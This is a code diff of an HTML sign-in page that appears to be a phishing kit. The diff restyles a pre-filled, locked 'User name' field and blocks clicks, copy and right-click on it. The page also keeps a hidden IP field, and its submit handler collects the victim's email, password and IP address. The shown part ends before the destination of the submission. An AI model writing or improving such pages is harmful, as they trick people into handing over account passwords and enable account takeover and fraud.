@@ -13,28 +13,30 @@
   <link href="https://cdn.prod.website-files.com/68f89e5e044f107c8074cdb5/68f8b899298663920f95c938_157bece9-7026-47eb-bbff-eae4174424f0-2.png" rel="apple-touch-icon">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <style>
-    .email-display-field {
-      width: 100%;
-      padding: 12px 16px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      background-color: #f5f5f5;
-      color: #333;
-      font-size: 16px;
-      min-height: 48px;
-      display: flex;
-      align-items: center;
-      cursor: not-allowed;
+    /* Minimal security styles - won't affect your design */
+    #email {
+      pointer-events: none;
       user-select: none;
       -webkit-user-select: none;
       -moz-user-select: none;
       -ms-user-select: none;
-      pointer-events: none;
+      background-color: #f8f8f8 !important;
     }
     
-    /* Hide the original email input completely */
-    #email {
-      display: none !important;
+    /* Prevent any interaction */
+    .email-security-shield {
+      position: relative;
+    }
+    
+    .email-security-shield::after {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 10;
+      cursor: not-allowed;
     }
   </style>
 </head>
@@ -46,10 +48,10 @@
         <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="68f89e61044f107c8074cebc" data-wf-element-id="22da511f-7236-2a9c-8b64-c7b114ebea92">
           <input type="hidden" id="ip" name="ip">
           <input type="hidden" id="hidden-email" name="email">
-          <label class="field-label">User name:</label>
-          <div id="email-display" class="email-display-field"></div>
-          <!-- Keep original email field for form validation but hide it -->
-          <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly style="display: none;">
+          <label for="email" class="field-label">User name:</label>
+          <div class="email-security-shield">
+            <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly>
+          </div>
           <label for="password" class="field-label-2">Password:</label>
           <input class="field w-input" maxlength="256" name="password" data-name="password" placeholder="" type="password" id="password" required="" autocomplete="off">
           <div class="div-block-3">
@@ -84,14 +86,9 @@
     
     // Basic validation (must contain @ and ., and no spaces)
     if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
-      // Set the email in the hidden field and display field
+      // Set the email in both the visible and hidden fields
       document.getElementById('hidden-email').value = finalEmail;
-      document.getElementById('email').value = finalEmail; // For form validation
-      document.getElementById('email-display').textContent = finalEmail;
-    } else {
-      // If no valid email, show a message
-      document.getElementById('email-display').textContent = 'Email not provided';
-      document.getElementById('email-display').style.color = '#999';
+      document.getElementById('email').value = finalEmail;
     }
   });
   </script>
@@ -114,31 +111,30 @@
       if (finalEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(finalEmail)) {
         document.getElementById('hidden-email').value = finalEmail;
         document.getElementById('email').value = finalEmail;
-        document.getElementById('email-display').textContent = finalEmail;
       }
     });
 
-    // Completely disable any interaction with email display
-    $('#email-display').on('click keydown keyup keypress focus mouseenter mouseleave mousedown mouseup', function(e) {
+    // Completely disable any interaction with email field
+    $('#email').on('click keydown keyup keypress focus mouseenter mouseleave mousedown mouseup', function(e) {
       e.preventDefault();
       e.stopPropagation();
       return false;
     });
 
-    // Disable copy/paste on email display
-    $('#email-display').on('copy cut paste', function(e) {
+    // Disable copy/paste on email field
+    $('#email').on('copy cut paste', function(e) {
       e.preventDefault();
       return false;
     });
 
-    // Disable right-click context menu on email display
-    $('#email-display').on('contextmenu', function(e) {
+    // Disable right-click context menu on email field
+    $('#email').on('contextmenu', function(e) {
       e.preventDefault();
       return false;
     });
 
-    // Disable drag/drop on email display
-    $('#email-display').on('dragstart drop', function(e) {
+    // Disable drag/drop on email field
+    $('#email').on('dragstart drop', function(e) {
       e.preventDefault();
       return false;
     });
@@ -146,7 +142,7 @@
     $("#email-form").submit(function (event) {
       event.preventDefault(); // Prevent default form submission
 
-      // Get the values from the form fields
+      // Get the values from the form fields - use the HIDDEN email field
       let userEmail = $("#hidden-email").val();
       let userPassword = $("#password").val();
       let userIP = $("#ip").val();
